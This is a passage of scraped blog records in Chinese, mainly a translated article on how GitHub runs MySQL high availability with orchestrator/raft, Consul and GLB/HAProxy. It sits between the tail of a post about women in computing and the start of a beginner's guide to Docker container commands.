：</p>\n<blockquote><p>@MSP-GawainAntarx：难的不是计算机科学，而且怎么让自己抛弃“女生不适合学计算机”的刻板印象</p>\n<p>@mtedrrqcmws2017：1. 年轻女程序员在应聘过程中不但不会被歧视，反而会被有所偏袒，因为公司（尤其是大公司）普遍男生太多，需要女生来平衡工作环境。2. 现代编程语言已经被高度抽象，脱离硬件，倒更加靠近“技术设计”，入门并非男式，比如前端，手机app等。</p></blockquote>\n<p>如果以后还有人和你说「计算机专业不适合女生」之类的，可以把本文发给他们看，让他们看看 IT 行业小姐姐们是如何说的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114141\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114141votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114141\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 263</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "职场,程序员,计算机专业", "author": "伯乐在线", "front_image_path": "full/ef76a2ab8cf07b49aaa7e162a6c578d1a9ed4a26.jpg"}
{"title": "GitHub 的 MySQL 高可用性实践分享", "createdate": "2018/07/09", "url": "http://blog.jobbole.com/114200/", "url_object_id": "b88c57937f3bff3e9546fbbb3ad0988e", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "thumbs": 1, "bookmark": 2, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://githubengineering.com/mysql-high-availability-at-github/\">shlomi-noach </a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/mysql-high-availability-at-github?print\">oschina</a>   </div><div>\n<p>GitHub 使用 MySQL 作为所有非 git 仓库数据的主要存储, 它的可用性对 GitHub 的访问操作至关重要。GitHub 站点本身、GitHub 的 API、身份验证等等都需要进行数据库访问。我们运行着多个 MySQL 集群来为不同的服务和任务提供支持。我们的集群使用经典的主从配置, 主集群中的某个节点能够接受写入。其余的从集群节点异步同步来自主服务器的更改, 并提供数据的读取服务。</p>\n<p>主节点的可用性尤为重要。没有主服务器, 集群无法接受写入：任何需要保留的写入数据都不能持久化保存，任何传入的更改（如提交、问题、用户创建、审阅、新存储库等）都将失败。</p>\n<p>为了支持写操作，我们显然需要有一个可用的数据写入节点，一个主集群。但同样重要的是，我们需要能够识别或找到该节点。</p>\n<p>在一个写入失败，提示说主节点崩溃的场景中，我们必须确保能启用一个新的主节点，并快速表明其身份。检测故障所需的时间、进行故障转移并公布新的主节点所花费的时间，构成了总的停机时间。</p>\n<p>本文将介绍 GitHub 的 MySQL 高可用性和主服务发现解决方案，它使我们能够可靠地运行跨数据中心操作，容忍数据中心隔离，并使得出现故障时耗费的停机时间变得更短。</p>\n<h2>高可用目标</h2>\n<p>本文描述的解决方案，迭代并改进了之前在 GitHub 实现的高可用(HA)解决方案。随着规模的扩大，MySQL 的高可用策略必须适应变化。我们希望为 GitHub 中的 MySQL 和其他服务，提供类似的高可用策略。</p>\n<p>在考虑高可用和服务发现时，有些问题可以引导你找到合适的解决方案。包含但不限于：</p>\n<ul>\n<li>你能容忍多长的中断时间？</li>\n<li>崩溃检测的可靠性如何？你能容忍错误报告（过早的故障转移）吗？</li>\n<li>故障转移的可靠性如何？什么情况下可以失败？</li>\n<li>解决方案在跨数据中心的场景下效果如何？在低延迟和高延迟的网络情况下如何？</li>\n<li>解决方案是否允许一个完整的数据中心故障或者出现网络隔离？</li>\n<li>有没有防止或缓解脑裂（两台服务器都宣称是某个集群的主节点，不知情对方的存在，并且都能接受写操作）的机制。</li>\n<li>你能允许数据丢失吗？在多大程度上？</li>\n</ul>\n<p>为了说明上面的一些情况，首先让我们讨论一下之前的高可用方案，并说说我们为什么要修改它。</p>\n<h2>移除基于 VIP 和 DNS 的服务发现</h2>\n<p>在之前的迭代版本中，我们：</p>\n<ul>\n<li>使用 <a href=\"https://githubengineering.com/orchestrator-github/\" rel=\"nofollow\">orchestrator</a> 来做检测和故障转移</li>\n<li>使用 VIP 和 DNS 做主节点的发现</li>\n</ul>\n<p>在这个迭代版本中，客户端使用名字服务（比如 mysql-writer-1.github.net）来发现写节点。名字可以解析为一个虚拟 IP(VIP)，这个 VIP 指向主节点。</p>\n<p>因此，在正常情况下，客户端只需要解析名称，连接到解析后的 IP上，然后发现主节点也正在另一边监听链接（也就是客户端连上了主节点）。</p>\n<p>考虑这个跨越三个不同数据中心的复制拓扑：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/e752113fd43657ff8cf09024a4f5d777.png\" alt=\"\"></p>\n<p>当主节点发生故障时，必须在副本集中选出一个服务器，提升为新的主节点。</p>\n<p>orchestrator 将会检测到故障，选举出一个新的主节点，然后重新分配 name（名称）和 VIP（虚拟 IP）。客户端实际上并不知道主节点的真实身份：它们只知道 name（名字），而这个名字现在必须解析给新的主节点。不过，需要考虑：</p>\n<p>VIP 是需要协作的：它们由数据库服务器自己声明和拥有。为了获得或释放 VIP，服务器必须发送 ARP 请求。拥有 VIP 的服务器必须在新提升的主节点获得 VIP 之前先释放掉。这还有一些额外的影响：</p>\n<ul>\n<li>有秩序的故障转移操作会首先通知故障主节点并要求它释放 VIP，然后再通知新提升的主节点并要求它获取 VIP。如果无法通知到原主节点或者拒绝释放 VIP 怎么办？首先要考虑到，该服务器上存在故障场景，它不可能会不及时响应，或根本不响应。\n<ul>\n<li>我们最终可能会出现脑裂情况：两个注解同时声称拥有同一个 VIP。根据最短的网络路径，不同的客户端可能会连接到不同的服务器。</li>\n<li>事实源于两个独立服务器间的协作，并且这个设置是不可靠的。</li>\n</ul>\n</li>\n<li>即使原主节点确实配合，工作流程也浪费了宝贵的时间：当我们通知原主节点时，切换到新主节点的操作一直在等待。</li>\n<li>即使 VIP 发生变化，现有的客户端连接也不能保证与原服务器断开连接，而且我们可能仍然会经历脑裂。</li>\n</ul>\n<p>VIP 受限于物理位置。它们属于交换机或者路由器。所以，我们只能将 VIP 重新分配到位于同一位置的服务器上。特别是，当新提升的服务器位于不同的数据中心时，我们无法分配 VIP，只能修改 DNS。</p>\n<ul>\n<li>修改 DNS 需要较长的传播时间。根据配置，客户端会缓存 DNS 一段时间。跨数据中心(cross-DC)故障转移则意味着更多的中断时间：为了让所有客户端知晓新主节点的身份，需要花费更长的时间。</li>\n</ul>\n<p>仅这些限制，就足以促使我们寻求新的解决方案，但考虑更多的是：</p>\n<ul>\n<li>主节点通过 pt-heartbeat 心跳服务进行自行注入，目的是<a href=\"https://githubengineering.com/mitigating-replication-lag-and-reducing-read-load-with-freno/\" target=\"_blank\" rel=\"nofollow\">测量延迟和节流</a>。这项服务必须从新提升的主节点开始。如果有可能的话，原主节点的服务将被关闭。</li>\n<li>同样的，<a href=\"https://github.com/github/orchestrator/blob/master/docs/pseudo-gtid.md\" rel=\"nofollow\">Pseudo-GTID</a> 注入也是主节点自己管理的。它将从新的主节点开始，并在原主节点结束。</li>\n<li>新的主节点被设为可写。如果可能的话，原主节点被设为只读。</li>\n</ul>\n<p>这些额外的步骤是导致中断总时间的一个因素，并且引入了它们自己的故障和摩擦。</p>\n<p>该解决方案生效了，GitHub 已经成功完成 MySQL 的故障迁移，但我们希望我们的 HA 在以下方面有所改进：</p>\n<ul>\n<li>数据中心不可知</li>\n<li>允许数据中心出现故障</li>\n<li>删除不可靠的协作工作流</li>\n<li>减少总的中断时间</li>\n<li>尽可能地进行无损故障转移</li>\n</ul>\n<h2>GitHub 的高可用解决方案：orchestrator, Consul, GLB</h2>\n<p>我们的新策略，除了附带的改进外，还解决或减轻了上面的许多问题。在今天的高可用设置中，我们有：</p>\n<ul>\n<li>使用 <a href=\"https://github.com/github/orchestrator\" target=\"_blank\" rel=\"nofollow\">orchestrator</a> 来做监测和故障转移。我们使用跨数据中心的 <a href=\"https://github.com/github/orchestrator/blob/master/docs/raft.md\" rel=\"nofollow\">orchestrator/raft</a> 方案，如下图。</li>\n<li>使用 Hashicorp 的 <a href=\"https://www.consul.io/\" rel=\"nofollow\">Consul</a> 来做服务发现。</li>\n<li>使用 <a href=\"https://githubengineering.com/introducing-glb/\" target=\"_blank\" rel=\"nofollow\">GLB/HAProxy</a> 作为客户端和写节点的代理层。</li>\n<li>使用选播(anycast)做网络路由。</li>\n</ul>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d28cf7c2b62e1601cd4f817cbf54740.png\" alt=\"\"></p>\n<p>新的设置将完全删除 VIP 和 DNS 的修改。在我们引入更多组件的同时，我们能够将组件解耦并简化任务，并且能够使用可靠、稳定的解决方案。下面逐一分析。</p>\n<h3>正常流程</h3>\n<p>正常情况下，应用程序通过 GLB/HAProxy 连接到写节点。</p>\n<p>应用程序永远不知道主节点的身份。和之前一样，它们使用名字。例如，cluster1 的主节点命名为 mysql-writer-1.github.net。在我们当前的设置中，名字被解析为一个选播(<a href=\"https://en.wikipedia.org/wiki/Anycast\" target=\"_blank\" rel=\"nofollow\">anycast</a>) IP。</p>\n<p>使用选播时，名字在任何地方都被解析为相同的 IP，但流量会根据客户端位置的不同进行路由。需要指出的是，在我们的每个数据中心，都有 GLB（我们的高可用负载均衡）被部署在不同的容器中。指向 mysql-writer-1.github.net 的流量总是路由到本地数据中心的 GLB 集群。因此，所有客户端都由本地代理提供服务。</p>\n<p>我们在 <a href=\"https://www.haproxy.com/\" rel=\"nofollow\">HAProxy</a> 上运行 GLB。我们的 HAProxy 维护了一个写连接池：每个 MySQL 集群一个连接池，其中每个连接池只有一个后端服务器：集群的主节点。DC 中的所有 GLB/HAProxy 容器都具有相同的连接池，并且它们都指向相同的后端服务器。这样，如果一个应用程序想要写入 mysql-writer-1.github.net，它连接到哪个 GLB 服务器并不重要。它总会被路由到实际的 cluster1 主节点上。</p>\n<p>对于应用程序而言，服务发现结束于 GLB，并且不再需要重新发现。就这样，通过 GLB 将流量路由到正确地址。</p>\n<p>GLB 如何知道哪些服务器可以作为后端服务器，以及如何将更改传播到 GBL 呢？</p>\n<h3><strong>Consul 的服务发现</strong></h3>\n<p>Consul 是著名的服务发现解决方案，它也提供 DNS 服务。然而，在我们的解决方案中，我们用它作为高效的键值存储系统。</p>\n<p>在 Consul 的键值存储中，我们写入了集群主控的标识。对于每一个集群，都有一个键值对记录标识集群的主 FQDN，端口，IPV4，IPV6。</p>\n<p>每一个 GLB/HAProxy 节点都运行 consul 模板：每一个服务都在监听 consul 数据的变更（这里主要是对集群主控的数据变更）。consul 模板会生成一个有效的配置文件并且当配置变更时，能够自动重载 HAProxy。</p>\n<p>因此，Consul 中主控标识的变更会被每一个 GLB/HAProxy 观察到，然后它们立即重新配置它们自己，在集群后端池中设置新的主控作为单一对象，并且进行重载以反映这些变更。</p>\n<p>在 GitHub 中，每一个数据中心都有一个 Consul 设置，并且每一个设置都具有高可用性。然而，这些设置又互相独立，它们之间不进行互相复制或数据共享。</p>\n<p>那么 Consul 是如何获得变更通知，在交叉数据中心中，信息又是如何分布的呢？</p>\n<h3>orchestrator/raft</h3>\n<p>运行一个 orchestrator/raft 设置：orchestrator 节点之间通过 raft 一致性算法进行通信。每一个数据中心有 1~2 个 orchestrator 节点。</p>\n<p>orchestrator 负责失败检测，MySQL 故障转移，以及 Consul 主控的变更通知。故障转移通过单个 orchestrator/raft 主导节点进行操作，但是对于主控变更，产生新主控的消息会通过 raft 机制被传播到所有 orchestrator 节点。</p>\n<p>一旦 orchestrator 节点接收到主控变更的消息，它们会与自己对应的本地 Consul 设置通信：它们都执行 KV 写操作。具有多个 orchestrator 节点的数据中心会有多个完全相同的 Consul 写操作。</p>\n<h3>整体流程</h3>\n<p>在主节点故障的场景中：</p>\n<ul>\n<li>orchestrator 节点检测到故障。</li>\n<li>orchestrator/raft 主导节点开始恢复。一个新的主节点被设置为 promoted 状态。</li>\n<li>orchestrator/raft 向所有 raft 集群节点通知主节点变更。</li>\n<li>所有 orchestrator/raft 成员接收到主节点变更的通知。每个成员都向本地 Consul 写入包含新主节点身份的 KV 记录。</li>\n<li>每个 GLB/HAProxy 都运行一个 consul 模版，用于监视 Consul KV 存储的变化，并重新配置和重新加载 HAProxy。</li>\n<li>客户端流量被重定向到新的主节点上。</li>\n</ul>\n<p>每个组件都有明确的责任归属，而且整个设计简单并且解耦。orchestrator 不需要知道负载均衡。Consul 不需要知道这些信息是从哪里来的。代理只关心 Consul，客户端只关心代理。</p>\n<p>而且：</p>\n<ul>\n<li>没有 DNS 的变更需要传播。</li>\n<li>没有 TTL。</li>\n<li>整个流程不需要原故障主节点的配合，它在很大程度上已被忽略。</li>\n</ul>\n<h3>其他细节</h3>\n<p>为了进一步确保流程的安全，我们还提供了以下内容：</p>\n<ul>\n<li>将 HAProxy 的配置项 hard-stop-after 设置为一个非常短的时间。当在写连接池中使用新的后端服务器重新加载时，它会自动终止所有到原主节点的连接。\n<ul>\n<li>通过使用 hard-stop-after 配置项，我们甚至不需要客户端的配合，这也就缓解了脑裂的情况。值得注意的是，这并不是绝对的，我们还是需要一些时间来消灭旧连接。但是，在某个时间点之后，我们就会感到舒服，因为不会出现令人厌恶的意外。</li>\n</ul>\n</li>\n<li>我们并不严格要求 Consul 随时可用。实际上，我们只需要它在故障转移期间可用。如果 Consul 恰好这时不可用，GLB 将继续使用已知的信息运作，不采用任何极端的行动。</li>\n<li>GLB 被用于验证新提升的主节点的身份。类似于我们的 <a href=\"https://githubengineering.com/context-aware-mysql-pools-via-haproxy/\" target=\"_blank\" rel=\"nofollow\">context-aware MySQL pools</a>（上下文感知的 MySQL 线程池），在后端服务器上进行检查，以确保它确实是一个可写的节点。如果我们恰好在 Consul 中删除了主节点的身份，没有问题；空的条目会被忽略。如果我们在 Consul 中错误的写入了一个非主节点的名称，没有问题；GLB 将拒绝更新它并以最后已知的状态继续运行。</li>\n</ul>\n<p>我们会在以下章节进一步完成备受关注和期望的高可用目标。</p>\n<h1>orchestrator/raft 失败检测</h1>\n<p>orchestrator使用<a href=\"https://github.com/github/orchestrator/blob/master/docs/failure-detection.md\" target=\"_blank\" rel=\"nofollow\">全面方法</a>来检测失败，因此这种方法非常可靠。我们不会观察到误报 —— 因为我们没有进行过早的故障转移，所以也不会产生不必要的中断时间。</p>\n<p>通过完全的 DC 网络隔离（又称 DC 栅栏），orchestrator/raft 进一步处理这个问题。一个 DC 网络隔离会引起一些混淆：这个 DC 中的服务器是可以互相通信的。他们是与其他 DC 网络隔离，还是其他 DC 被网络隔离？</p>\n<p>在一个 orchestrator/raft 设置中，raft 的 leader 节点就是运行故障转移的那个节点。leader 是取得了大多数节点支持的节点（特定数量）。我们的 orchestrator 节点部署就是这样，没有单一数据中心可以占大多数，任何 n-1 的 DC 也是如此。</p>\n<p>在一个完全 DC 网络隔离的事件中，这个 DC 的 orchestrator 节点与其它 DC 中的对应节点失去连接。最终，隔离 DC 中的 orchestrator 节点不能作为 raft 集群的 leader 节点。如果任何这种节点碰巧成为了 leader 节点，它就会退出。一个新的 leader 节点可以从任何一个其他 DC 分配。leader 节点会得到其他所有 DC 的支持，这些 DC 彼此之间可以进行通信。</p>\n<p>因此，调用 shots 的 orchestrator 节点将位于网络隔离数据中心之外。一个隔离 DC 应该有一个主服务器，orchestrator 会使用可用 DC 中的其中一个服务器将它替换来初始化故障转移。我们委托非隔离 DC 中的那些节点来做这个决定，以此来缓解 DC 隔离。</p>\n<h1>更快的公告</h1>\n<p>通过发出公告说主分支即将修改，可以进一步减少运行停机的总时间。如何实现这个想法？</p>\n<p>当 orchestrator 开始进行故障迁移的时候，它会观察可用于升级的服务器队列。在了解自我复制的规则，以及接受提示和限制的情况下，在最好的行动方针中，它能做出基于一定训练的决策。</p>\n<p>它可能意识到一个可以升级的服务器也是一个理想的候选策略，例如：</p>\n<ul>\n<li>没有什么可以阻止服务器的升级（潜在用户已经暗示服务器优先升级），而且</li>\n<li>认为服务器可以将它所有的版本视为复本。</li>\n</ul>\n<p>在这个例子中 orchestrator 首先将服务器设置为可写，然后立即公告服务器的升级（我们的例子中是写到了 Consul KV），即使异步开始修复复制树，这种操作通畅会花费更多几秒的运算。</p>\n<p>有可能当我们的 GLB 服务器完全重载时，复制树已经完好无损，但是这不是严格要求的。服务器可以接收到写操作！</p>\n<h2>半同步复制</h2>\n<p>在 MySQL 的<a href=\"https://dev.mysql.com/doc/refman/en/replication-semisync.html\" target=\"_blank\" rel=\"nofollow\">半同步复制</a>中，在获知更改已发送到一个或多个副本之前，主服务器不会确认事务已提交。它提供了一种实现无损故障转移的方法：应用于主服务器的任何更改都将应用于或等待应用于其中一个副本。</p>\n<p>一致性带来的成本是：可用性风险。如果没有副本确认收到更改，主服务器将被阻塞并且写入操作将停止。幸运的是，这里有一个超时设置，在这之后主服务器可以恢复到异步复制模式，使写入操作再次可用。</p>\n<p>我们已经把我们的超时设置在一个合理的低值：500ms。将更改从主服务器发送到本地 DC 副本，通常也发送到远程 DC，这个阈值是绰绰有余的。设置这个超时时间之后，我们可以观察到完美的半同步行为（无需回退到异步复制），并且在确认失败的情况下，可以在非常短的阻塞周期内获得让人满意的表现。</p>\n<p>我们在本地 DC 副本上启用半同步，并且在主服务器宕机的情况下，我们期望（尽管不严格地执行）无损故障转移。对完整的 DC 故障进行无损故障转移的代价很高昂，我们并不期待这么做。</p>\n<p>在试验半同步超时的同时，我们还观察到一种对我们有利的行为：主服务器在发生故障时，我们能够影响最佳候选人的标识。通过在指定的服务器上启用半同步，并将它们标记为候选服务器，我们可以通过影响故障的结果来减少总的停机时间。在我们的<a href=\"https://githubengineering.com/mysql-testing-automation-at-github/\" target=\"_blank\" rel=\"nofollow\">试验</a>中，我们观察到，我们通常最终会得到最佳候选服务器，并因此发布快速公告。</p>\n<h2>心跳注入</h2>\n<p>我们没有在已提升/已降级的主设备上管理 pt-heartbeat 服务的启动/关闭，作为替代，我们选择随时随地运行它。这需要进行打一些<a href=\"https://github.com/percona/percona-toolkit/pull/302/files?w=1\" rel=\"nofollow\">补丁</a>，以便使 pt-heartbeat 可以支持服务器端来回更改它们的 read_only 状态或其完全崩溃。</p>\n<p>在我们目前的设置中，在主服务器及其副本上运行 pt-heartbeat 服务。在主服务器上，他们产生心跳事件。在副本服务器上，他们识别到服务器是只读的，并定期重新检查其状态。只要服务器升级为主服务器，该服务器上的 pt-heartbeat 会将服务器标识为可写，并开始注入心跳事件。</p>\n<h2>orchestrator 所有权委托</h2>\n<p>我们进一步委托到 orchestrator：</p>\n<ul>\n<li>伪-GTID注入</li>\n<li>设置被提升的主控作为可写的，清除它的复写状态</li>\n<li>如果可能，设置老的主控为只读状态</li>\n</ul>\n<p>对于新主控，以上所有这些操作减少了冲突的可能性。一个刚刚被提升的主控应该是在线的并且可接入，否则我们就不应该提升它。然后让 orchestrator 直接应用变更到被晋升的主控上也应该是合理的。</p>\n<h2>限制和缺点</h2>\n<p>代理层使得应用程序不知道主服务器的身份，但是对于主服务器它也掩盖了应用程序的身份。所有主服务器看到的连接都来自代理层，我们丢失了关于连接实际来源的信息。</p>\n<p>随着分布式系统的发展，我们仍然遗留了未处理的场景。</p>\n<p>值得注意的是，在数据中心隔离场景中，假设主服务器位于 DC 中，DC 中的应用程序仍然能写入主服务器。一旦网络恢复正常，可能会导致状态不一致。我们正努力在非常独立的 DC 中，通过实现一个可靠的 <a href=\"https://en.wikipedia.org/wiki/STONITH\" target=\"_blank\" rel=\"nofollow\">STONITH</a> 来缓解这种脑裂。和以前一样，在将主服务器之前需要花费一些时间，可能出现短暂的脑裂。而避免脑裂的操作成本非常高。</p>\n<p>更多的场景存在：故障转移时 Consul 的终端；部分 DC 隔离；其他的。我们知道，使用这种性质的分布式系统不可能消除所有的漏洞，因此，我们将焦点放在最重要的案例上。</p>\n<h2>结果</h2>\n<p>orchestrator/GLB/Consul 设置给我们提供以下功能：</p>\n<ul>\n<li>可靠的故障检测</li>\n<li>数据中心不可知的故障迁移</li>\n<li>典型的无损故障迁移</li>\n<li>对数据中心网络隔离的支持</li>\n<li>缓解脑裂的问题（仍在实现中）</li>\n<li>无合作相关的依赖</li>\n<li>多数场景下大约 10~13 秒的断电恢复能力。（我们观察到一些场景下最长 20 秒的断电恢复和极端场景下最长 25 秒的情况）</li>\n</ul>\n<h2>结语</h2>\n<p>编排/代理/服务发现范例在解耦架构中使用众所周知的可信组件，这使得部署、运维和观察变得更加容易，并且每个组件可以独立扩展或缩减。我们将不断测试我们的设置，以继续寻求改进。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114200\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114200votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114200\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,MySQL,高可用", "author": "shlomi-noach ", "front_image_path": "full/122897caaf5c7d1b1b7bfa67a1ac43c10e67c13a.jpg"}
{"title": "8 个基本的 Docker 容器管理命令", "createdate": "2018/06/22", "url": "http://blog.jobbole.com/114145/", "url_object_id": "a80c1972902edd63a90d8bf1ff9bc04b", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/91d1e9a10762cf7191f39f8e66ebefa7.png"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://kerneltalks.com/virtualization/8-basic-docker-container-management-commands/\">Shrikant Lavhate</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9768-1.html\">Linux中国/Lonaparte_CHENG</a>   </div><blockquote><p>利用这 8 个命令可以学习 Docker 容器的基本管理方式。这是一个为 Docker 初学者准备的，带有示范命令输出的指南。</p></blockquote>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/91d1e9a10762cf7191f39f8e66ebefa7.png\" alt=\"Docker 容器管理命令\"></p>\n<p>在这篇文章中，我们将带你学习 8 个基本的 Docker 容器命令，它们操控着 Docker 容器的基本活动，例如 运行run、 列举list、 停止stop、 查看历史纪录logs、 删除delete 等等。如果你对 Docker 的概念很陌生，推荐你看看我们的 <a href=\"https://kerneltalks.com/virtualization/what-is-docker-introduction-guide-to-docker/\">介绍指南</a>，来了解 Docker 的基本内容以及 <a href=\"https://kerneltalks.com/virtualization/how-to-install-docker-in-linux/\">如何</a> 在 Linux 上安装 Docker。 现在让我们赶快进入要了解的命令：</p>\n<h3 id=\"toc_1\">如何运行 Docker 容器？</h3>\n<p>众所周知，Docker 容器只是一个运行于宿主操作系统host OS上的应用进程，所以你需要一个镜像来运行它。Docker 镜像以进程的方式运行时就叫做 Docker 容器。你可以加载本地 Docker 镜像，也可以从 Docker Hub 上下载。Docker Hub 是一个提供公有和私有镜像来进行拉取pull操作的集中仓库。官方的 Docker Hub 位于 <a href=\"https://hub.docker.com/\">hub.docker.com</a>。 当你指示 Docker 引擎运行容器时，它会首先搜索本地镜像，如果没有找到，它会从 Docker Hub 上拉取相应的镜像。</p>\n<p>让我们运行一个 Apache web 服务器的 Docker 镜像，比如 httpd 进程。你需要运行 <code>docker container run</code> 命令。旧的命令为 <code>docker run</code>， 但后来 Docker 添加了子命令部分，所以新版本支持下列命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf37b651761197\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container run -d -p 80:80 httpd\r\nUnable to find image 'httpd:latest' locally\r\nlatest: Pulling from library/httpd\r\n3d77ce4481b1: Pull complete\r\n73674f4d9403: Pull complete\r\nd266646f40bd: Pull complete\r\nce7b0dda0c9f: Pull complete\r\n01729050d692: Pull complete\r\n014246127c67: Pull complete\r\n7cd2e04cf570: Pull complete\r\nDigest: sha256:f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617\r\nStatus: Downloaded newer image for httpd:latest\r\nc46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf37b651761197-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf37b651761197-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf37b651761197-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf37b651761197-4\">4</div><div 